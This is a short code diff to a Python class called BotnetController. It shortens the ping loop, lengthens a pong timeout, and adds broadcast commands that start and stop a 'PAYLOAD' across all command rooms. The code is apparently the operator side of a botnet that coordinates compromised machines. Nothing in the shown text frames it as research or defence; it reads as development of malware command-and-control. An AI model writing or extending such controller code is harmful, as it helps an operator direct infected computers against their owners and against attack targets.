@@ -96,7 +96,7 @@ class BotnetController:
         self.command_room_lock = threading.Lock()
         
         self.pong_window_start = 0
-        self.pong_window_dur = 30
+        self.pong_window_dur = 45
 
     def login(self):
         # login and sync
@@ -211,13 +211,17 @@ class BotnetController:
         self.send_command("PAYLOAD:START", room)
     
     def start_payload_all_rooms(self):
-        for id, room in self.command_rooms.items():
-            self.start_payload_on_room(room)
+        self.send_to_all("PAYLOAD:START")
+
+    def stop_payload_on_room(self, room: CommandRoom):
+        self.send_command("PAYLOAD:STOP", room)
+    
+    def stop_payload_all_rooms(self):
+        self.send_to_all("PAYLOAD:STOP")
 
     def ping_loop(self):
-        time.sleep(2)
         while True:
-            time.sleep(10)
+            time.sleep(15)
             # Mark
             with self.command_room_lock:
                 for room in self.command_rooms.values():
